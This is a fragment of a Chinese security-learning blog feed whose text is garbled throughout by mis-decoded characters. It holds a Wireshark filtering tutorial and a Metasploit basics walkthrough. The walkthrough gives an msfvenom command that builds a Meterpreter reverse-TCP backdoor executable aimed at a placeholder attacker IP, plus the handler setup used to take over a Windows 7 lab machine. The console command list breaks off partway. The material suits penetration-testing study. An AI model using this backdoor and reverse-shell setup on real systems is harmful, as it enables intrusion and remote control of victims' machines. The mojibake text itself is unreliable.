title="æ•è·é€‰é¡¹"></a>æ•è·é€‰é¡¹</h2><p>æ•è·é€‰é¡¹ä¸»è¦é’ˆå¯¹æŠ“å–æ•°æ®åŒ…ä½¿ç”¨çš„ç½‘å¡ã€æŠ“åŒ…å‰çš„è¿‡æ»¤ã€æŠ“åŒ…å¤§å°ã€æŠ“åŒ…æ—¶é•¿ç­‰è¿›è¡Œè®¾ç½®ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨æŠ“åŒ…è½¯ä»¶ä¸­ä¹Ÿå±äºéå¸¸é‡è¦çš„ä¸€ä¸ªè®¾ç½®ã€‚</p><p><strong>æ•°æ®åŒ…çš„è¿‡æ»¤è®¾ç½®</strong></p><p>WiresharkæŠ“åŒ…è¿‡æ»¤æ˜¯åŸºäºlibpcapWinpcapåº“å®ç°çš„ï¼Œæ‰€ä»¥éµå¾ªBPF(Berke-ley Packet Filter)è¯­æ³•ï¼Œå…¶ä¸­åŒ…æ‹¬ç±»å‹(Type)ã€æ–¹å‘(Dir)ã€åè®®(Proto)ã€é€»è¾‘è¿ç®—ç¬¦ã€‚</p><ul><li>ç±»å‹ï¼šhostã€netã€port</li><li>æ–¹å‘ï¼šsrcã€dst</li><li>åè®®ï¼šetherã€ipã€tcpã€udpã€httpã€ftpç­‰</li><li>é€»è¾‘è¿ç®—ç¬¦ï¼š&amp;&amp;ä¸ã€||æˆ–ã€!é</li></ul><p>ä¾‹å¦‚æƒ³è¦æŠ“å–æºåœ°å€ä¸º192.168.0.100ç›®çš„ç«¯å£ä¸º80çš„æµé‡ï¼Œè¿‡æ»¤è¯­å¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">src host 192.168.0.100 &amp;&amp; dst port 80<br></code></pre></td></tr></table></figure><p>æƒ³è¦æŠ“å–ipä¸º192.168.0.100å’Œ192.168.0.101çš„æµé‡ï¼Œè¿‡æ»¤è¯­å¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host 192.168.0.100 || host 192.168.0.101<br></code></pre></td></tr></table></figure><p>æƒ³è¦æŠ“å–é™¤å¹¿æ’­å¤–çš„æ‰€æœ‰åŒ…ï¼Œè¿‡æ»¤è¯­å¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">! broadcast<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151450158.png" alt="image-20240329234755443"></p><p><strong>å¸¸ç”¨çš„è¿‡æ»¤å™¨å†™æ³•</strong></p><ol><li><p>è¿‡æ»¤macåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ether host &lt;éœ€è¦è¿‡æ»¤çš„MACåœ°å€&gt;<br>ether src host &lt;MACåœ°å€&gt;<br>ether dst host &lt;MACåœ°å€&gt;<br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤IPåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host &lt;éœ€è¿‡æ»¤çš„IPåœ°å€&gt;<br>src host&lt;IPåœ°å€&gt;<br>dst host&lt;Påœ°å€&gt;<br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">prot 80<br>! prot 80<br>dst port 80<br>srcport 80<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>æŠ“åŒ…è¿‡æ»¤ä¸€æ—¦è®¾ç½®åå°†åªæŠ“å–ç¬¦åˆè§„åˆ™çš„æ•°æ®åŒ…ï¼Œè¿™æ ·ä¼šè¿‡æ»¤æ‰å¤§é‡å¹²æ‰°æ•°æ®åŒ…ï¼Œä»è€Œæé«˜æŠ“åŒ…æ•°æ®çš„å‡†ç¡®ç‡ã€‚</p></blockquote><h2 id="è¿‡æ»¤æ•°æ®åŒ…"><a href="#è¿‡æ»¤æ•°æ®åŒ…" class="headerlink" title="è¿‡æ»¤æ•°æ®åŒ…"></a>è¿‡æ»¤æ•°æ®åŒ…</h2><p>è¿‡æ»¤æ•°æ®åŒ…æ—¶æŠ“å–å®Œä¹‹åä½¿ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ˜¾ç¤ºå‡ºæ‰€éœ€è¦çš„æ•°æ®åŒ…</p><p><strong>è¯­æ³•è§„åˆ™å¦‚ä¸‹</strong></p><ul><li>æ¯”è¾ƒæ“ä½œç¬¦ï¼š&#x3D;&#x3D;ç­‰äºã€!&#x3D;ä¸ç­‰äºã€&gt;å¤§äºã€&lt;å°äºã€&gt;&#x3D;å¤§äºç­‰äºã€&lt;&#x3D;å°äºç­‰äºã€‚</li><li>é€»è¾‘æ“ä½œï¼šand ä¸æ“ä½œã€oræˆ–æ“ä½œã€xorå¼‚æˆ–æ“ä½œã€notéæ“ä½œã€‚</li><li>IPåœ°å€ï¼šip.addrã€ip.srcã€ip.dstã€‚</li><li>è¿‡æ»¤ç«¯å£ï¼štcp.portã€tcp.srcportã€tcp.dstportã€tep.flags.synã€ tep.flags.ackã€‚</li><li>è¿‡æ»¤åè®®ï¼šarpã€ipã€icmpã€udpã€tcpã€bootpã€dnsç­‰</li></ul><p>ä¾‹å¦‚æƒ³è¦è¿‡æ»¤æŒ‡å®šipçš„æ•°æ®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ip.addr==192.168.1.1<br>ip.src==192.168.1.1<br>ip.dst==192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151450159.png" alt="image-20240330000207628"></p><blockquote><p>wiresharkä¹Ÿä¼šè‡ªå¸¦è¡¥å…¨ï¼Œç±»ä¼¼ä»£ç è¡¥å…¨æç¤ºçš„é‚£æ ·</p></blockquote><p>æ›´å¤šè¯­æ³•å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1442007">https://cloud.tencent.com/developer/article/1442007</a></p><h2 id="æ•°æ®åŒ…åˆ†æ"><a href="#æ•°æ®åŒ…åˆ†æ" class="headerlink" title="æ•°æ®åŒ…åˆ†æ"></a>æ•°æ®åŒ…åˆ†æ</h2><p><strong>æ•°æ®è¿½è¸ª</strong></p><p>æ­£å¸¸é€šä¿¡ä¸­å¦‚TCPã€UDPã€SSLç­‰æ•°æ®åŒ…éƒ½æ˜¯ä»¥åˆ†ç‰‡çš„å½¢å‘é€çš„ï¼Œå¦‚æœåœ¨æ•´ä¸ªæ•°æ®åŒ…ä¸­åˆ†ç‰‡æŸ¥çœ‹æ•°æ®åŒ…ä¸ä¾¿äºåˆ†æï¼Œä½¿ç”¨æ•°æ®æµè¿½è¸ªå¯ä»¥å°†TCPã€UDPã€SSLç­‰æ•°æ®æµè¿›è¡Œé‡ç»„ï¼Œä»¥ä¸€ä¸ªå®Œæ•´çš„å½¢å¼å‘ˆç°å‡ºæ¥ã€‚</p><p>å¼€å¯è¿½è¸ªæµçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š</p><ol><li>åœ¨æ•°æ®æµæ˜¾ç¤ºåˆ—è¡¨ä¸­é€‰ä¸­è¦è¿½è¸ªçš„æ•°æ®æµï¼Œå³å‡»ç„¶åé€‰æ‹©è¿½è¸ªæµèœå•å‘½ä»¤ã€‚</li><li>é€‰æ‹©â€åˆ†æâ€èœå•ï¼Œç„¶åé€‰æ‹©è¿½è¸ªæµã€‚</li></ol><p>æ¯”å¦‚æˆ‘è¿™é‡Œé€‰æ‹©è¿½è¸ªä¸€ä¸ªhttpæµï¼Œä»–å°±ä¼šæ˜¾ç¤ºæœ‰å…³è¿™ä¸ªè¿™ä¸ªæ•°æ®å‰åç›¸å…³çš„æ•´ä¸ªé€šä¿¡è¿‡ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151450160.png" alt="image-20240330002214560"></p><blockquote><p>çº¢è‰²æ˜¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›çš„ç»“æœæ˜¯è“è‰²</p></blockquote><p>ç„¶åæˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°è¯¥httpè¯·æ±‚ä¹‹å‰çš„tcpä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151450161.png" alt="image-20240330002406512"></p><p>åé¢åˆ™æ˜¯ä¼ è¾“å®Œæˆåçš„å››æ¬¡æŒ¥æ‰‹</p><p><img src="http://cdn.clown2024.cn/202407151450162.png" alt="image-20240330002541147"></p><p>é¡ºä¾¿è¯´æ˜è¿™ä¸ªæ•°æ®åŒ…çš„å…·ä½“ç»“æ„ï¼Œæ‹¿è¿™ä¸ªhttpè¯·æ±‚ä¸ºä¾‹</p><p><img src="http://cdn.clown2024.cn/202407151450163.png" alt="image-20240330002653500"></p><p>ä¸Šé¢ä»ä¸Šåˆ°ä¸‹å¯¹åº”ç€è®¡ç®—æœºç½‘ç»œä¸­çš„äº”å±‚æ¨¡å‹ï¼šç‰©ç†å±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ã€åº”ç”¨å±‚ï¼›å¦‚æœåªæ˜¯tcpåè®®çš„è¯ä»–å°±åªæœ‰å‰å››å±‚</p><p><img src="http://cdn.clown2024.cn/202407151450164.png" alt="image-20240330002805666"></p><p><strong>ç»Ÿè®¡æ•°æ®åŒ…</strong></p><p>é€šè¿‡å¯¹æ•°æ®åŒ…çš„ç»Ÿè®¡åˆ†æï¼Œå¯ä»¥æŸ¥çœ‹æ›´ä¸ºè¯¦ç»†çš„æ•°æ®ä¿¡æ¯ï¼Œè¿›è€Œåˆ†æç½‘ç»œä¸­æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜ã€‚</p><ol><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€æ•è·æ–‡ä»¶å±æ€§â€ï¼Œåœ¨å…¶ä¸­å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ã€äº‹ä»¶ã€æ•è·ã€æ¥å£ç­‰ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151450165.png" alt="image-20240330003100727"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€åè®®åˆ†çº§â€ï¼Œå¯ä»¥ç»Ÿè®¡å‡ºæ¯ä¸€ç§åè®®åœ¨æ•´ä¸ªæ•°æ®åŒ…ä¸­çš„å æœ‰ç‡</p><p><img src="http://cdn.clown2024.cn/202407151450166.png" alt="image-20240330003233495"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€ä¼šè¯â€ï¼Œå…¶ä¸­åŒ…æ‹¬ä»¥å¤ªç½‘ã€IPv4ã€IPv6ã€TCPã€UDPç­‰ä¸åŒåè®®ä¼šè¯ä¿¡æ¯å±•ç¤ºã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450167.png" alt="image-20240330003457780"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€ç«¯ç‚¹â€ï¼Œå…¶ä¸­åŒ…å«ä»¥å¤ªç½‘å’Œå„ç§åè®®é€‰é¡¹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450168.png" alt="image-20240330003730343"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€åˆ†ç»„é•¿åº¦â€ï¼Œå¯ä»¥å¯¹ä¸åŒå¤§å°çš„æ•°æ®åŒ…è¿›è¡Œç»Ÿè®¡</p><p><img src="http://cdn.clown2024.cn/202407151450169.png" alt="image-20240330003838451"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€I&#x2F;Oå›¾è¡¨â€ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ªåæ ‡è½´æ˜¾ç¤ºçš„å›¾è¡¨ï¼Œä¸‹æ–¹å¯ä»¥æ·»åŠ ä»»æ„çš„åè®®ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©åè®®æ˜¾ç¤ºçš„é¢œè‰²ï¼Œè¿˜å¯ä»¥è°ƒæ•´åæ ‡è½´çš„åˆ»åº¦ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450170.png" alt="image-20240330004032643"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€æµé‡å›¾â€ï¼Œå…¶ä¸­åŒ…æ‹¬é€šä¿¡æ—¶é—´ã€é€šä¿¡åœ°å€ã€ç«¯å£ä»¥åŠé€šä¿¡è¿‡ç¨‹ä¸­çš„åè®®åŠŸèƒ½</p><p><img src="http://cdn.clown2024.cn/202407151450171.png" alt="image-20240330004146063"></p></li><li><p>é€‰æ‹©ç»Ÿè®¡èœå•ä¸­çš„â€TCPæµå‹å›¾â€ï¼Œåœ¨å…¶ä¸­å¯ä»¥æ ¹æ®å®é™…éœ€è¦è®¾ç½®ç›¸åº”çš„æ˜¾ç¤ºï¼Œè¿˜å¯ä»¥åˆ‡æ¢æ•°æ®åŒ…çš„æ–¹å‘ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450172.png" alt="image-20240330004340761"></p></li></ol><h1 id="å¸¸è§æ¼æ´æµé‡åˆ†æ"><a href="#å¸¸è§æ¼æ´æµé‡åˆ†æ" class="headerlink" title="å¸¸è§æ¼æ´æµé‡åˆ†æ"></a>å¸¸è§æ¼æ´æµé‡åˆ†æ</h1><p>è¿™é‡Œé‡‡ç”¨dvwaé¶åœºæ¥è¿›è¡Œæµé‡åˆ†æ</p><h2 id="sqlæ³¨å…¥æµé‡åˆ†æ"><a href="#SQLæ³¨å…¥æµé‡åˆ†æ" class="headerlink" title="SQLæ³¨å…¥æµé‡åˆ†æ"></a>SQLæ³¨å…¥æµé‡åˆ†æ</h2>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfåŸºç¡€ä½¿ç”¨å­¦ä¹ </title>
      <link href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="msfç®€ä»‹"><a href="#msfç®€ä»‹" class="headerlink" title="msfç®€ä»‹"></a>msfç®€ä»‹</h1><p>Metasploit Frameworkæ˜¯ä¸€ä¸ªç»¼åˆæ€§æ¸—é€æµ‹è¯•å·¥å…·ï¼Œé›†æˆä¿¡æ¯æ”¶é›†ã€æ¼æ´æ‰«æã€æ¼æ´åˆ©ç”¨ä»¥åŠææƒç­‰åŠŸèƒ½çš„å·¥å…·</p><h1 id="msfç›®å½•æ„æˆ"><a href="#msfç›®å½•æ„æˆ" class="headerlink" title="msfç›®å½•æ„æˆ"></a>msfç›®å½•æ„æˆ</h1><p><strong>msfçš„ç›®å½•ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441613.png" alt="image-20240328235414919"></p><p><strong>msfçš„å„ä¸ªæ¨¡å—</strong></p><p>MSFæœ‰7ä¸ªæ¨¡å—ï¼Œåˆ†åˆ«å¯¹ä¸‹é¢ç›®å½•ä¸‹çš„7ä¸ªå­æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/share/metasploit-framework/modules<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441614.png" alt="image-20240328235616101"></p><ol><li><p>auxiliaryï¼šè´Ÿè´£æ‰§è¡Œä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’ŒDosæ”»å‡»ç­‰åŠŸèƒ½çš„è¾…åŠ©æ¨¡å—</p></li><li><p>encodersï¼šå¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œèº²é¿AntiVirusæ£€æŸ¥çš„æ¨¡å—</p></li><li><p>evasionï¼šè¿™æ˜¯ç”¨äºåˆ›å»ºå…æ€æœ¨é©¬çš„æ¨¡å—</p></li><li><p>exploitsï¼šåˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œï¼Œæ­¤æ¨¡å—å¯¹åº”æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ï¼ˆä¸»åŠ¨ã€è¢«åŠ¨ï¼‰</p><p><img src="http://cdn.clown2024.cn/202407151441615.png" alt="image-20240329000437236"></p><p>è¿™é‡Œçœ‹ä¸€ä¸‹Windowsçš„ä¸€äº›ææƒè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework/modules/exploits/windows/local<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441616.png" alt="image-20240329000459473"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šè„šæœ¬å¯ä»¥ä½¿ç”¨ï¼Œåç»­ä¼šè¿›è¡Œå­¦ä¹ ä½¿ç”¨ã€‚</p></li><li><p>payloadsï¼šæˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚åˆ†ä¸º3ç§ç±»å‹çš„payloadï¼Œåˆ†åˆ«æ˜¯singleã€stageså’Œstagersã€‚shellcodeæ˜¯ç‰¹æ®Šçš„payloadï¼Œç”¨äºæ‹¿shellã€‚</p><ul><li>singleï¼šall-in-oneã€‚å®Œæ•´çš„payloadï¼Œè¿™äº›payloadéƒ½æ˜¯ä¸€ä½“åŒ–çš„ï¼Œä¸éœ€è¦ä¾èµ–å¤–éƒ¨çš„åº“å’ŒåŒ…ã€‚</li><li>stagersï¼šç›®æ ‡è®¡ç®—æœºå†…å­˜æœ‰é™æ—¶ï¼Œå…ˆä¼ è¾“ä¸€ä¸ªè¾ƒå°çš„payloadç”¨äºå»ºç«‹è¿æ¥</li><li>stagesï¼šåˆ©ç”¨stagerså»ºç«‹çš„è¿æ¥ä¸‹è½½åç»­payload</li></ul></li><li><p>postï¼šåæœŸæ¸—é€æ¨¡å—ã€‚åœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒåï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ</p></li><li><p>nopsï¼šæé«˜payloadç¨³å®šæ€§åŠç»´æŒå¤§å°ã€‚åœ¨æ¸—é€æ”»å‡»æ„é€ æ¶æ„æ•°æ®ç¼“å†²åŒºæ—¶ï¼Œå¸¸å¸¸è¦åœ¨çœŸæ­£è¦æ‰§è¡Œçš„Shellcodeä¹‹å‰æ·»åŠ ä¸€æ®µç©ºæŒ‡ä»¤åŒºï¼Œ è¿™æ ·å½“è§¦å‘æ¸—é€æ”»å‡»åè·³è½¬æ‰§è¡ŒShellCodeæ—¶ï¼Œæœ‰ä¸€ä¸ªè¾ƒå¤§çš„å®‰å…¨ç€é™†åŒºï¼Œä»è€Œé¿å…å—åˆ°å†…å­˜ åœ°å€éšæœºåŒ–ã€è¿”å›åœ°å€è®¡ç®—åå·®ç­‰åŸå› é€ æˆçš„ShellCodeæ‰§è¡Œå¤±è´¥ï¼Œæé«˜æ¸—é€æ”»å‡»çš„å¯é æ€§ã€‚</p></li></ol><h1 id="ä½¿ç”¨msfä¸Šçº¿meterpreter"><a href="#ä½¿ç”¨msfä¸Šçº¿meterpreter" class="headerlink" title="ä½¿ç”¨msfä¸Šçº¿meterpreter"></a>ä½¿ç”¨msfä¸Šçº¿meterpreter</h1><p>è¿™é‡Œä½¿ç”¨Windows7æ¥ä½œä¸ºå—å®³æœºå™¨</p><p><strong>ç”Ÿæˆä¸€ä¸ªåé—¨æ–‡ä»¶ç”¨äºç±»ä¼¼åå¼¹shell</strong></p><p>åœ¨MSFä¸­ï¼Œä¸€èˆ¬æˆ‘ä»¬ç”Ÿæˆpayloadç¨‹åºåé—¨ä¹‹ç±»çš„éƒ½æ˜¯ç”¨<code>msfvenom</code>ï¼Œmsfvenomæ˜¯æ”»å‡»è½½è·ç”Ÿæˆå’Œç¼–ç å™¨</p><p>ä¸»è¦å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-p payload<br>-e ç¼–ç æ–¹å¼,æŒ‡å®šç¼–ç å™¨ï¼Œå¯ä»¥å®ç°å…æ€<br>-i ç¼–ç æ¬¡æ•°ã€‚æŒ‡å®šç¼–ç è¿­ä»£æ¬¡æ•°ï¼Œä¸€èˆ¬é…åˆå…æ€ä½¿ç”¨<br>-b: å»æ‰åå­—ç¬¦ï¼Œåå­—ç¬¦ä¼šå½±å“payload æ­£å¸¸æ‰§è¡Œ<br>LHOST,LPORT ç›‘å¬ä¸Šçº¿çš„ä¸»æœºIPå’Œç«¯å£<br>-f æŒ‡å®šç”Ÿæˆæ ¼å¼ï¼Œå¦‚exe ç”ŸæˆEXEæ ¼å¼<br>-o æŒ‡å®šæ–‡ä»¶åç§°å’Œå¯¼å‡ºä½ç½®<br>-l å¯ä»¥æŸ¥çœ‹å¯ä»¥åˆ©ç”¨payload<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œçš„åé—¨æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;æ”»å‡»æœºIP&gt; lport=&lt;ç›‘å¬çš„ç«¯å£å·&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441617.png" alt="image-20240329002507164"></p><p>ç„¶åæˆ‘ä»¬å¯åŠ¨msfconsoleå¼€å¯ç›‘å¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost &lt;æ”»å‡»è€…IP&gt;<br>set lport &lt;ç›‘å¬ç«¯å£&gt;<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441618.png" alt="image-20240329003229229"></p><p>ç„¶åæŠŠæˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„åé—¨æ–‡ä»¶ä¸Šä¼ åˆ°Windows7ä¸Šé¢è¿è¡Œä¹‹åå°±å¯ä»¥è·å¾—ç”¨æˆ·æƒé™ï¼Œå¾—åˆ°meterpreter</p><p><img src="http://cdn.clown2024.cn/202407151441619.png" alt="image-20240329102808964"></p><p>ç„¶åå°±å¯ä»¥è¾“å…¥ä¸€äº›å‘½ä»¤è¿›è¡Œå…¶ä»–æ“ä½œäº†ï¼Œæ¯”å¦‚getuidæŸ¥çœ‹ä¸€ä¸‹å½“å‰çš„èº«ä»½</p><p><img src="http://cdn.clown2024.cn/202407151441620.png" alt="image-20240329102935408"></p><h2 id="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"><a href="#ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"></a>ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤</h2><p>ç›´æ¥å‚è€ƒè¿™ç¯‡æ–‡ç« copyäº†è¿‡æ¥ï¼š<a href="https://www.freebuf.com/articles/web/387662.html">https://www.freebuf.com/articles/web/387662.html</a></p><h2 id="ä¸»ç•Œé¢çš„å‘½ä»¤"><a href="#ä¸»ç•Œé¢çš„å‘½ä»¤" class="headerlink" title="ä¸»ç•Œé¢çš„å‘½ä»¤"></a>ä¸»ç•Œé¢çš„å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç <br>show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…·<br>show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹<br>show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç <br>show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹<br>search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å—<br>info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯<br>use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å—<br>back â€“ å›é€€ set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•°<br>setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•°<br>save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨<br>cd æ›´æ”¹å½“å‰çš„å·¥ä½œç›®å½•<br>æ ¸å¿ƒå‘½ä»¤<br>Sessions è½¬å‚¨ä¼šè¯åˆ—è¡¨å¹¶æ˜¾ç¤ºæœ‰å…³ä¼šè¯çš„ä¿¡æ¯<br>Color åˆ‡æ¢é¢œè‰²<br>Set å°†ç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡è®¾ç½®ä¸ºä¸€ä¸ªå€¼<br>Connect è¿æ¥ä¸ä¸»æœºé€šä¿¡<br>Setg å°†å…¨å±€å˜é‡è®¾ç½®ä¸ºä¸€ä¸ªå€¼<br>exit é€€å‡ºæ§åˆ¶å°<br>sleep åœ¨æŒ‡å®šçš„ç§’æ•°å†…ä¸åšä»»ä½•äº‹æƒ…<br>get è·å–ç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡çš„å€¼<br>spool å°†æ§åˆ¶å°è¾“å‡ºå†™å…¥æ–‡ä»¶ä»¥åŠå±å¹•<br>getg è·å–å…¨å±€å˜é‡çš„å€¼<br>threads çº¿ç¨‹æŸ¥çœ‹å’Œæ“ä½œåå°çº¿ç¨‹<br>grep grep å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º<br>unload å¸è½½æ¡†æ¶æ’ä»¶<br>history æ˜¾ç¤ºå‘½ä»¤å†å²<br>unset å–æ¶ˆè®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡<br>irb è¿›å…¥irbè„šæœ¬æ¨¡å¼<br>unsetg å–æ¶ˆè®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªå…¨å±€å˜é‡<br>load åŠ è½½ä¸€ä¸ªæ¡†æ¶æ’ä»¶<br>version æ˜¾ç¤ºæ¡†æ¶å’Œæ§åˆ¶å°åº“ç‰ˆæœ¬å·<br>quit é€€å‡ºæ§åˆ¶å°<br>route é€šè¿‡ä¼šè¯è·¯ç”±æµé‡<br>save ä¿å­˜æ´»åŠ¨çš„æ•°æ®å­˜å‚¨<br>æ•°æ®åº“åç«¯å‘½ä»¤<br>analyze åˆ†ææœ‰å…³ç‰¹å®šåœ°å€æˆ–åœ°å€èŒƒå›´çš„æ•°æ®åº“ä¿¡æ¯<br>db_connect è¿æ¥åˆ°ç°æœ‰æ•°æ®æœåŠ¡<br>db_disconnect æ–­å¼€ä¸å½“å‰æ•°æ®æœåŠ¡çš„è¿æ¥<br>db_export å¯¼å‡ºåŒ…å«æ•°æ®åº“å†…å®¹çš„æ–‡ä»¶<br>db_import å¯¼å…¥æ‰«æç»“æœæ–‡ä»¶ï¼ˆå°†è‡ªåŠ¨æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼‰<br>db_nmap æ‰§è¡Œnmapå¹¶è‡ªåŠ¨è®°å½•è¾“å‡º<br>db_rebuild_cache é‡å»ºæ•°æ®åº“å­˜å‚¨çš„æ¨¡å—é«˜é€Ÿç¼“å­˜<br>db_remove åˆ é™¤å·²ä¿å­˜çš„æ•°æ®æœåŠ¡æ¡ç›®<br>db_save å°†å½“å‰æ•°æ®æœåŠ¡è¿æ¥ä¿å­˜ä¸ºå¯åŠ¨æ—¶é‡æ–°è¿æ¥çš„é»˜è®¤å€¼<br>db_status æ˜¾ç¤ºå½“å‰æ•°æ®æœåŠ¡çŠ¶æ€<br>hosts åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¸»æœº<br>loot åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æˆ˜åˆ©å“<br>notes 